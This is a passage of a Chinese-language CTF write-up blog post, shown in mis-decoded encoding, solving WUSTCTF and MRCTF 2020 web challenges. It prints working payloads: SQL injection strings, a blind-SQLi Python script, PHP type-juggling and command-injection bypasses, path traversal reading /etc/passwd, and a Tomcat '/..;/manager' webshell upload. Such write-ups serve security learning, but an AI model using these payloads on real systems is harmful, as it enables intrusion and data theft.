å‡ºé¢˜äººåå­—å°±å¥½ï¼Œå¾—åˆ°å‡ºé¢˜äººblog<br>(è€å®è¯´æ¶æ„å¼•æµä¸å¥½å§â€¦â€¦)<br>å¯ä»¥åœ¨åšå®¢å‰ç«¯çœ‹åˆ°éƒ¨åˆ†flagï¼Œä½†æ˜¯åªæœ‰ä¸€åŠï¼Œåä¸€åŠé€šè¿‡åšå®¢é“¾æ¥åˆ°githubå»,å¯ä»¥æ‰¾åˆ°ååŠéƒ¨åˆ†</p><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>å¼€å§‹éšæ‰‹ä¸€ä¸ªä¸‡èƒ½å¯†ç <code>admin&#39; or 1=1#</code>å°±è¿›å»äº†ã€‚<br><code>/adddddddddddddddddddddddminnnnnnnnnnnnnnnnnnnnnn.php</code><br>ç„¶åå°±æ˜¯æ”¹headerä»¥åŠgetï¼Œpostå€¼å³å¯<br>å¾—åˆ°paste.ubuntuåˆ†æ®µç»™å‡ºçš„ç½‘é¡µé“¾æ¥ï¼Œæ‰¾åˆ°æ­£ç¡®çš„å³å¯å¾—åˆ°ç¼–ç åçš„flagã€‚è§£ç å³å¯</p><h2 id="CV-Maker"><a href="#CV-Maker" class="headerlink" title="CV Maker"></a>CV Maker</h2><p>åŸºç¡€ä¸Šä¼ ,ç™»å½•æ³¨å†Œåå…ˆä¸Šä¼ ä¸€ä¸ªphp,æŠ¥çš„æ˜¯exif_imagetype()æ£€æŸ¥ã€‚é‚£å°±åªè¦æ–‡ä»¶å¤´è§£å†³å°±å¥½äº†ï¼Œä¼ ä¸€ä¸ªé©¬<br>,å‰é¢åŠ ä¸ŠGIF89Aå³å¯ã€‚<br>(è¿™é‡Œè¿˜æœ‰uploadsçš„ç›®å½•éå†,éšä¾¿ä¸€ä¸ªéƒ½æ˜¯ç°æˆçš„å‚è€ƒæ¡ˆä¾‹)<br>èšå‰‘è¿æ¥åæ ¹ç›®å½•<code>/readflag</code>å³å¯ã€‚</p><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>è¿™é¢˜æ˜¯é“javaé¢˜ã€‚æˆ‘ç”¨éé¢„æœŸåšå‡ºæ¥çš„ã€‚æ¯•ç«Ÿè‡ªå·±javaçŸ¥è¯†æœ‰é™â€¦â€¦</p><p>é¦–å…ˆè¿›å»åˆæ˜¯ä¸ªä¸Šä¼ ï¼Œä¼ ä¸€ä¸ªæ–‡ä»¶ä¸Šå»çœ‹åˆ°çˆ†å‡ºä¸€ä¸ªdownloadè·¯ç”±ä¸fileå‚æ•°<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>é‚£å°±æœ‰ä»»æ„æ–‡ä»¶ä¸‹è½½<br>javaé¢˜å¿…è¯»çš„å‡ ä¸ªé…ç½®æ–‡ä»¶,é¦–å…ˆå°±æ˜¯WEB-INFä¸‹çš„web.xml</p><pre><code class="xml">    &lt;context-param&gt;        &lt;param-name&gt;webAppRootKey&lt;/param-name&gt;        &lt;param-value&gt;tomcat.ajp&lt;/param-value&gt;    &lt;/context-param&gt;    &lt;listener&gt;        &lt;listener-class&gt;            org.springframework.web.util.WebAppRootListener        &lt;/listener-class&gt;    &lt;/listener&gt;    &lt;welcome-file-list&gt;        &lt;welcome-file&gt;/WEB-INF/views/index.jsp&lt;/welcome-file&gt;    &lt;/welcome-file-list&gt;    &lt;error-page&gt;        &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;        &lt;location&gt;/error&lt;/location&gt;    &lt;/error-page&gt;&lt;/web-app&gt;</code></pre><p>åªæœ‰ä¸€ä¸ªindex.jsp,åŒæ ·ä¸‹è½½åå‘ç°æ²¡ä»€ä¹ˆå†…å®¹ã€‚<br>è¿™æ—¶å¼€å§‹å°è¯•è¯»å–å…¶ä»–æ–‡ä»¶ï¼Œæ„é€ åå‘ç°å¯ä»¥è¯»å–åˆ°/etc/passwd</p><pre><code class="bash">root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/bin/falsemessagebus:x:101:102::/var/run/dbus:/bin/falsesshd:x:102:65534::/run/sshd:/usr/sbin/nologinsystemd-timesync:x:103:104:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:104:105:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:106:107:systemd Bus Proxy,,,:/run/systemd:/bin/falsetomajp:x:1000:1000::/home/tomajp:/bin/bash</code></pre><p>æœ‰æ„æ€çš„æ˜¯,æˆ‘ä»¬é¢˜ç›®èµ·çš„tomajpç”¨æˆ·çš„å®¶ç›®å½•æ˜¯ bin/bash.è¿™ç‚¹è®©æˆ‘æƒ³èµ·äº†ä¹‹å‰åšç½‘é¼æ¯Commentè¿™é“é¢˜çš„ä¸€ä¸ªæ”¶è·ï¼š<br>äºŒæ¬¡æ³¨å…¥,æ•°æ®åº“å´æ²¡æœ‰flag,é€šè¿‡è¯»å–.bash_historyå‘ç°äº†å…¶ä»–æ–‡ä»¶å¤¹ä¸­æœªåˆ é™¤çš„flagä»è€Œè¯»å–ã€‚<br>é‚£ä¹ˆæœ¬é¢˜å°è¯•è¯»å–<code>/home/tomajp/.bash_history</code><br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å‘ç°æœ‰è¹Šè··ï¼Œæ‹–åˆ°ä¸‹é¢æœ‰å‘ç°<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ ¹æ®è¿™é‡Œè®°å½•çš„æ“ä½œå¯ä»¥çœ‹åˆ°ï¼Œflagåº”è¯¥æ˜¯åœ¨æ ¹ç›®å½•çš„flaaaagæ–‡ä»¶å¤¹ä¸‹çš„what_you_want<br>ç›´æ¥è¯»å–å³å¯<br><code>/download?file=../../../../../../../../../flaaaag/what_you_want</code><br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é—®äº†ä¸‹å®˜æ–¹,çš„ç¡®æ˜¯ä¸ªæ¯”è¾ƒç®€å•çš„éé¢„æœŸ,é¢„æœŸè§£æ˜¯ä¸Šä¼ jspè¿›è¡ŒRCE.ä½†æ˜¯æˆ‘ä¸€ç›´æ²¡å¼„æ˜ç™½tomcaté‡Œä¸Šä¼ ç›®å½•è¦æ€ä¹ˆè®¿é—®ï¼Œè¿™ä¸ªå¯èƒ½æ˜¯åƒäº†ä¸ç†Ÿæ‚‰javaweb<br>çš„é”…ã€‚ä¸è¯´äº†ï¼Œä¹‹å‰è¯´å¥½è¦å­¦javawebä¹Ÿå¾—æä¸Šæ—¥ç¨‹äº†ã€‚<br>ps:èµ›åäº†è§£åˆ°æ˜¯ghostcatæ‰“ã€‚è¿™ä¸ªå°±å¾ˆæœ‰è¶£äº†ï¼Œå› ä¸ºåŒæœŸçš„å¦ä¸€ä¸ªå›½é™…èµ›æœ‰é¢˜ä¹Ÿæ˜¯è¿™ä¸ªå¹½çµçŒ«ã€‚æ‰¾æ—¶é—´ç­‰buuä¸Šé¶æœºäº†å¤ç°ä¸‹è¿™ä¸ªæ´ã€‚<br>ä¸ç”¨ç­‰äº†ï¼Œç›´æ¥çœ‹æˆ‘ä¸‹ä¸€ç¯‡æ–‡ç« å³å¯ã€‚åšä¸€ä¸ªè„šæœ¬å°å­ï¼Œghostcatåˆ©ç”¨è¿˜æ˜¯ä¸éš¾çš„ã€‚</p><h2 id="æœ´å®æ— å"><a href="#æœ´å®æ— å" class="headerlink" title="æœ´å®æ— å"></a>æœ´å®æ— å</h2><p>å…ˆæ”¾ä¸€ä¸ªæ²¡æ‹¿åˆ°ä¸€è¡€çš„åŸå› <br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ‰‹æ…¢ä¸€æ­¥åŠ ä¸Šå‡ºé¢˜äººæƒé™æ²¡æ§å¥½,ç›´æ¥flagè¢«åˆ äº†ã€‚å¯¼è‡´æˆ‘å¤šèŠ±äº†åŠä¸ªå°æ—¶,æ‰¾å‡ºé¢˜äººæ²Ÿé€šåå¥½äº†ã€‚ä¸è¿‡è¯´åˆ°åº•æ…¢ä¸€æ­¥flagè¢«åˆ è¿˜æ˜¯å› ä¸ºåªæœ‰äºŒè¡€çš„æ‰‹é€Ÿâ€¦â€¦</p><p>é¦–å…ˆæ˜¯ä¿¡æ¯æ”¶é›†ï¼Œè¿™é‡Œå¥‡æ€ªçš„ä¸€ç‚¹æ˜¯<code>/.git/</code>ç›®å½•ç›´æ¥æš´éœ²åœ¨å¤–äº†,ä½†æ˜¯ä»”ç»†è§‚å¯Ÿä¸‹å‘ç°åªæ˜¯ä¸ªlampçš„git.ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä¸ºäº†æ··æ·†è§†å¬æ•…æ„æ”¾çš„ã€‚åæ­£æˆ‘æ˜¯githackç”¨äº†å‡ æ¬¡æ‰å¯Ÿè§‰ä¸å¯¹åŠ²çš„ã€‚</p><p>ä¸ªäººä¿¡æ¯æ”¶é›†ä¸€ç›´æ˜¯æ‰‹æµ‹,æµ‹äº†å¥½å¤šæºç æ³„éœ²æ²¡ååº”åæ³¨æ„åˆ°index.phpç½‘é¡µçš„æ ‡é¢˜ä¸ºbotã€‚äºæ˜¯è€ƒè™‘robots.txtï¼Œå‘ç°äº†<code>fAke_f1agggg.php</code><br>è®¿é—®åå½“ç„¶æ²¡æœ‰çœŸflagï¼Œä½†æ˜¯headeré‡Œæœ‰<code>fl4g.php</code>ï¼Œå¾—åˆ°é¢˜ç›®æºç </p><pre><code class="php">&lt;?phpheader(&#39;Content-type:text/html;charset=utf-8&#39;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#39;num&#39;])){    $num = $_GET[&#39;num&#39;];    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){        echo &quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;;    }else{        die(&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;);    }}else{    die(&quot;å»éæ´²å§&quot;);}//level 2if (isset($_GET[&#39;md5&#39;])){   $md5=$_GET[&#39;md5&#39;];   if ($md5==md5($md5))       echo &quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;;   else       die(&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;);}else{    die(&quot;å»éæ´²å§&quot;);}//get flagif (isset($_GET[&#39;get_flag&#39;])){    $get_flag = $_GET[&#39;get_flag&#39;];    if(!strstr($get_flag,&quot; &quot;)){        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);        echo &quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;;        system($get_flag);    }else{        die(&quot;å¿«åˆ°éæ´²äº†&quot;);    }}else{    die(&quot;å»éæ´²å§&quot;);}?&gt;</code></pre><p>è€å¥—å¨ƒäº†ã€‚<br>ç¬¬ä¸€å±‚ä¸€ä¸ªintvalçš„é—®é¢˜ã€‚<br>è¿™é‡Œä½¿ç”¨çš„æ˜¯ä¸€ä¸ªè¿›åˆ¶çš„æŠ€å·§ï¼Œæ¯”å¦‚2020çš„16è¿›åˆ¶7e4<br>intvalä¼šå°†å­—ç¬¦ä¸²7e4è®¤ä½œ7,è€Œintval(â€œ7e4â€+1)åˆ™è¢«ç±»å‹è½¬æ¢ï¼Œå˜ä¸º70001</p><p>ç¬¬äºŒå±‚å¼±ç±»å‹æ¯”è¾ƒçš„é—®é¢˜<br><code>$md5==md5($md5)</code><br>ä½†æ˜¯åŸæ¥æ ¡èµ›æ€»ç»“æ—¶å°±å¼ºè°ƒè¿‡ï¼Œç½‘ä¸Šä¸€ç›´ä»¥æ¥çš„è¯´æ³•å¾ˆä¸å‡†ç¡®ã€‚å¹¶éæ˜¯0eå¼€å¤´æ‰ä¼šè¢«åˆ¤ä½œ0.è€Œæ˜¯å› ä¸º0eå¼€å¤´ä¸”çº¯æ•°å­—ç„¶åæ‰èƒ½è¢«è½¬ä¸º0<br><a href="https://www.jianshu.com/p/52f04f85824e" target="_blank" rel="noopener">https://www.jianshu.com/p/52f04f85824e</a><br>æ•…æˆ‘ä»¬éœ€è¦0eå¼€å¤´çº¯æ•°å­—çš„æ•°ï¼Œä½¿å¾—å…¶MD5å€¼0eå¼€å¤´ä¸”çº¯æ•°å­—ã€‚<br>å› æ­¤è¿™ä¸ªä¸€å®šæ˜¯è¦è„šæœ¬è·‘çš„ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©æ”¾å¼ƒhhhã€‚æ‰¾é˜Ÿå‹è¦äº†ä»¥å‰è®²è¿‡è¿™ä¸ªtrickçš„æ–‡ç« ï¼Œå¾—åˆ°äº†è¿™ä¸ªç¥å¥‡æ•°å­—0e215962017</p><p>ç¬¬ä¸‰å±‚åŸºç¡€è‡³æã€‚<code>ca\t</code>å¯ä»¥ç»•è¿‡å…³é”®å­—ï¼Œ<code>${IFS}</code>æ›¿ä»£ç©ºæ ¼ï¼Œè¯»flagå¯ä»¥ç›´æ¥ç”¨<code>fll*</code>ï¼Œæˆ–è€…ç›´æ¥cat <code>cat `ls`</code> å³å¯ã€‚<br>ä¸»è¦è¿˜æ˜¯è¢«äººæ…å±å¯¼è‡´å¤šè¯•äº†å¥½ä¹…,è¿˜é¡ºä¾¿æ‰“ç®—å¼¹shellã€‚ç»“æœè¯•äº†5ç§æ–¹æ³•éƒ½æ²¡æˆ,çœŸçš„æ°”äºº<br>payload</p><pre><code>?num=7e4&amp;md5=0e215962017&amp;get_flag=ca\t${IFS}`ls`</code></pre><h2 id="é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="é¢œå€¼æˆç»©æŸ¥è¯¢"></a>é¢œå€¼æˆç»©æŸ¥è¯¢</h2><p>è£¸çš„æ•°å€¼å¸ƒå°”ç›²æ³¨ï¼Œç›´æ¥ä¸Šifåˆ†æµå°±å®Œäº‹ã€‚<br>å¥½åƒè¿‡æ»¤äº†ç©ºæ ¼ï¼Œé‚£å°±æ‹¬å·å¤šå¥—ä¸€ä¸‹ã€‚<br>å› ä¸ºæ‰“é”™äº†å‚æ•°<code>stunum</code>ï¼Œå¯¼è‡´åªæ‹¿åˆ°ä¸‰è¡€ã€‚æ°”æ­»äº†â€¦ä»¥åä¸€å®šç›´æ¥å¤åˆ¶ç²˜è´´urlã€‚åƒå¤§äºã€‚</p><pre><code class="python">import requestsimport urllib.parseurl=&#39;http://101.200.53.102:10114/index.php?stunum=&#39;flag=&#39;&#39;for i in range(1,50):    print(i)    for str1 in &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.{}-&quot;:        payload = &quot;if(ascii(substr((select(group_concat(value))from(flag)),&quot;+str(i)+&quot;,1))=&quot; + str(ord(str1)) + &quot;,1,2)&quot;        payload = urllib.parse.quote(payload)        r = requests.get(url + payload)        if &#39;admin&#39; in r.text:            flag+=str1            print(flag)            break</code></pre><p><del>æœ‰é“1è§£é¢˜è²Œä¼¼å¾ˆé¡¶å°±æ²¡æœ‰çœ‹ã€‚</del></p><h2 id="Train-Yourself-To-Be-Godly"><a href="#Train-Yourself-To-Be-Godly" class="headerlink" title="Train Yourself To Be Godly"></a>Train Yourself To Be Godly</h2><p>åˆ°buuä¸Šå¤ç°äº†ã€‚ä»”ç»†åšä¼šå‘ç°è¿˜æ˜¯ç»†èŠ‚ä¸Šé—®é¢˜æ¯”è¾ƒå¤šã€‚<br>é¦–å…ˆæ˜¯åˆ†æã€‚å› ä¸ºé¢˜ç›®æ˜¾ç¤ºçš„é¡µé¢æ˜¯tomcaté»˜è®¤çš„<code>/examples</code>è·¯ç”±ã€‚é‚£ä¹ˆè¯´æ˜æ˜¯ç”¨examplesåšçš„æ ¹ç›®å½•<br><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a><br>ç„¶åæ˜¯è¿™ä¸ªæ–‡æ¡£ã€‚<br>å¯ä»¥æ„é€ è·¯å¾„ç©¿è¶Šï¼Œæ¥åˆ°å…¶ä»–è·¯å¾„ä¸‹ã€‚æ¯”å¦‚æ­¤å¤„ä¸ºäº†getshell,è¿›å…¥<code>/manager</code>æ„é€ <code>/..;/manager</code><br>ä¹‹åä¸€ä¸ªtomcat:tomcatçš„å¼±å£ä»¤ã€‚<br>å…·ä½“getshellæµç¨‹å¯ä»¥å‚è€ƒvulhubä¸Štomcat/tomcat8çš„æ¼æ´Tomcat7+ å¼±å£ä»¤ &amp;&amp; åå°getshellæ¼æ´ã€‚[<a href="https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8]" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8]</a><br>(<a href="https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8)æˆ‘ä¹Ÿç®€å•å¤ç°äº†ä¸‹ï¼Œå¯ä»¥å»æˆ‘çš„vulhubå¤ç°æ–‡ç« é‚£çœ‹ã€‚" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8)æˆ‘ä¹Ÿç®€å•å¤ç°äº†ä¸‹ï¼Œå¯ä»¥å»æˆ‘çš„vulhubå¤ç°æ–‡ç« é‚£çœ‹ã€‚</a><br>å…ˆç»™å‡ºwebshell.jspä¸webshell.warçš„ç”Ÿæˆæ–¹æ³•</p><pre><code class="javascript">&lt;%%&gt;</code></pre><p>å¸¦å›æ˜¾ä¸å¯†ç çš„jspï¼Œæ¯”è¾ƒå¥½ç”¨ã€‚<br>ç„¶åå‘½ä»¤è¡Œå¯ä»¥ç”Ÿæˆwar<br><code>jar cvf webshell.war webshell.jsp</code><br>è²Œä¼¼ç›´æ¥å‹ç¼©jspæˆzipç„¶åæ”¹åç¼€ä¸ºwarä¹Ÿå¯ä»¥ã€‚<br>è¿›å…¥åè‡ªç„¶æ˜¯ä¸Šä¼ waråŒ…äº†ã€‚ä½†æ˜¯å¾ˆå¿«å‘ç°ç‚¹å‡»ä¸Šä¼ åè¿”å›404ã€‚è€Œå®ƒçš„è·¯å¾„ç»™çš„æ˜¯</p><pre><code>/examples/..;/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=A226F07F06C2C983EE2911A5963BFA84</code></pre><p>çœ‹æ¥æ˜¯åˆä»æ ¹ç›®å½•å¼€å§‹åŠ è½½è·¯å¾„äº†ï¼Œè¿™ä¸ªç”¨åŒæ ·çš„æ–¹æ³•ï¼Œå°†è·¯å¾„æ”¹æˆ<br><code>/..;/manager/html/upload......</code>å³å¯<br>ä¸è¿‡å¾ˆå¿«ä¼šå‘ç°401ã€‚æœªæˆæƒè®¿é—®ã€‚å¦‚æœç†Ÿæ‚‰tomcatçš„å¾ˆå¿«èƒ½ååº”è¿‡æ¥æ˜¯å°‘äº†headeré‡Œçš„è®¤è¯ï¼Œå½“ç„¶åœ¨æˆåŠŸè®¿é—®åå°æ—¶æŠ“åŒ…ä¹Ÿèƒ½çœ‹åˆ°è‡ªå·±çš„headerä¸­æœ‰è®¤è¯å¤´ã€‚<br><code>Authorization: Basic dG9tY2F0OnRvbWNhdA==</code><br>åé¢å°±æ˜¯tomcat:tomcatçš„base64ç¼–ç ã€‚è¿™é‡Œæ˜¾ç„¶å› ä¸ºæˆ‘ä»¬æ˜¯é€šè¿‡æ„é€ è·¯å¾„ç©¿è¶Šçš„é—®é¢˜ï¼Œæ²¡æœ‰åœ¨uploadæ—¶è‡ªåŠ¨å¸¦ä¸Šã€‚<br>é‚£ä¹ˆç»§ç»­ä¸Šä¼ ï¼Œå‘ç°403.åªèƒ½æ˜¯cookieçš„é—®é¢˜äº†ã€‚å›å¤´å»çœ‹è®¿é—®<code>/..;/manager/html</code>æ—¶å°±å­˜åœ¨set-cookieçš„è¿”å›ã€‚é‚£ä¹ˆåªèƒ½æ˜¯ç¼ºcookieäº†ã€‚<br>å…·ä½“åšæ³•ï¼šé‡æ–°è®¿é—®ä¸€é<code>/..;/manager/html</code>ä»è¿”å›å¤´å–ä¸€ä¸ªcookie.ç„¶åä¸Šä¼ æ—¶æŠ“åŒ…æ‹¦æˆªï¼ŒæŠŠè®¤è¯è·Ÿcookieä»¥åŠè®¿é—®åœ°å€å…¨éƒ¨æ”¹å¥½ï¼Œç›´åˆ°200ä¸ºæ­¢ã€‚<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ç„¶åå°±å¯ä»¥è®¿é—®webshellè¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ã€‚è¿™é‡Œflagæ¯”èµ›æ˜¯åœ¨æ ¹ç›®å½•çš„æ–‡ç« ä¸­ï¼Œbuuæ˜¯åœ¨æ ¹ç›®å½•.<br><code>/..;/webshell/exp.jsp?pwd=023&amp;i=cat%20/flagggg</code></p><h1 id="MRCTF"><a href="#MRCTF" class="headerlink" title="MRCTF"></a>MRCTF</h1><p>å¤©ç’‡çš„æ¯”èµ›ç›¸å¯¹WUSTå°±éš¾ä¸€ç‚¹ï¼Œç„¶è€Œè¿˜æ˜¯ä¸€å †å¥—å¨ƒã€‚å¿ƒé‡Œè‹¦ã€‚å¥—å¨ƒé¢˜å¤šçœŸçš„æ˜¯CTFæ¯”èµ›æ€ªç°çŠ¶äº†,è„±ç¦»äº†CTFçš„æœ¬è´¨â€¦</p><h2 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h2><p>è€å¥—å¨ƒäº†ã€‚æ–¹æ³•éƒ½è€å¥—äº†ã€‚<br>ç¬¬ä¸€æ­¥ä¸€ä¸ªMD5ç¢°æ’ï¼Œç½‘ä¸Šä¸€å †ç°æˆçš„ã€‚<br>ç¬¬äºŒæ­¥ä¸€ä¸ªisnumeric()ï¼Œåªéœ€è¦åœ¨æ•°å­—åéšä¾¿åŠ ä¸ªç¬¦å·å°±å¯ä»¥ç»•è¿‡</p><h2 id="ä½ ä¼ ä½ ğŸå‘¢"><a href="#ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="ä½ ä¼ ä½ ğŸå‘¢"></a>ä½ ä¼ ä½ ğŸå‘¢</h2><p>æ–‡ä»¶ä¸Šä¼ åŸºæœ¬å¥—è·¯ï¼Œè¯•äº†ä¸‹å‘ç°phpå¯è§£æçš„å‡ ä¸ªåç¼€éƒ½æ²¡äº†ã€‚é‚£è¯•è¯•<code>.htaccess</code>å‘ç°å¯ä»¥ã€‚é‚£å°±æ²¡äº‹äº†ï¼Œç»•æ–‡ä»¶æ£€æŸ¥ä¸Šä¼ jpgå›¾ç‰‡é©¬</p><pre><code>addtype application/x-httpd-php .jpg</code></pre><h2 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h2><p>æˆ‘æ‰¿è®¤è¿™é¢˜æ˜¯æˆ‘è‡ªå·±èœäº†ã€‚<br>å¼€å§‹å‰ç«¯ä¸€ä¸ªéªŒè¯MD5ï¼Œä½†æ˜¯æ˜¯ä¸ªjsã€‚æˆ‘è¿˜è·‘å»æœjsçš„MD5å¼±ç±»å‹ï¼Œå‘ç°å¥½åƒå°±æ²¡æœ‰è¿™ä¸ªtrickå•Šâ€¦</p><p>åæ¥æ‰æ³¨æ„flag.phpè¯´ä»–è®°å½•äº†æ‰€æœ‰è´­ä¹°è€…ip<br>æ‰€ä»¥<code>X-Forwarded-For:127.0.0.1</code>è®¿é—®å³å¯</p><h2 id="å¥—å¨ƒ"><a href="#å¥—å¨ƒ" class="headerlink" title="å¥—å¨ƒ"></a>å¥—å¨ƒ</h2><p>å…ˆæ˜¯è¦ç»•ç¬¬ä¸€å±‚ï¼Œä½†æ˜¯æ€ä¹ˆçœ‹ç€å°±åƒæˆ‘ä»¬nctfçš„é¢˜å‘¢ï¼Ÿ</p><pre><code class="php">&lt;?php$query = $_SERVER[&#39;QUERY_STRING&#39;]; if( substr_count($query, &#39;_&#39;) !== 0 || substr_count($query, &#39;%5f&#39;) != 0 ){    die(&#39;Y0u are So cutE!&#39;);} if($_GET[&#39;b_u_p_t&#39;] !== &#39;23333&#39; &amp;&amp; preg_match(&#39;/^23333$/&#39;, 